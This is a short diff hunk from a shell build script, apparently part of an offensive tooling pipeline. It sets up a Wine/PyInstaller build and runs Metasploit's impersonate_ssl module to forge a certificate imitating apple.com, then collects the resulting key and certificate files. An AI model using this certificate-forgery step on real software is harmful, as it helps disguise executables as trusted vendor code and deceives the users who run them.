@@ -66,7 +66,7 @@ mkdir -p "$WINEPREFIX/drive_c/pyinstaller-build"
 
 # --- Generate Fake CA with Metasploit ---
 color_print CYAN "[*] Generating fake certificate using Metasploit..."
-msfconsole -qx "use auxiliary/gather/impersonate_ssl; set RHOSTS apple.com; run; exit"
+msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS apple.com;run;exit"
 
 CERT_CRT=$(find "$HOME/.msf4/loot/" -type f -name "*.crt" | head -1)
 CERT_KEY=$(find "$HOME/.msf4/loot/" -type f -name "*.key" | head -1)
